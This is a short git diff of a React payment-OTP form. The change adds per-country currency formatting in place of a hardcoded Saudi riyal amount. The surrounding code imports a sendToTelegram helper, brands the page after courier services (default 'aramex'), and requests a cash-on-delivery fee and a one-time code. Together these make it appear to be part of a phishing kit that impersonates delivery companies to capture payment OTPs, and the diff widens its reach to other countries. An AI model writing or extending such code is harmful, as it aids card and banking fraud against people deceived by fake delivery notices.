@@ -8,6 +8,7 @@ import { Shield, AlertCircle, ArrowLeft } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
+import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
 
 const PaymentOTPForm = () => {
   const { id } = useParams();
@@ -28,10 +29,13 @@ const PaymentOTPForm = () => {
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
-  
+
+  // Get country from link data
+  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
+
   const shippingInfo = linkData?.payload as any;
   const amount = shippingInfo?.cod_amount || 500;
-  const formattedAmount = `${amount} ر.س`;
+  const formattedAmount = formatCurrency(amount, selectedCountry);
   
   // Demo OTP: 123456
   const DEMO_OTP = "123456";
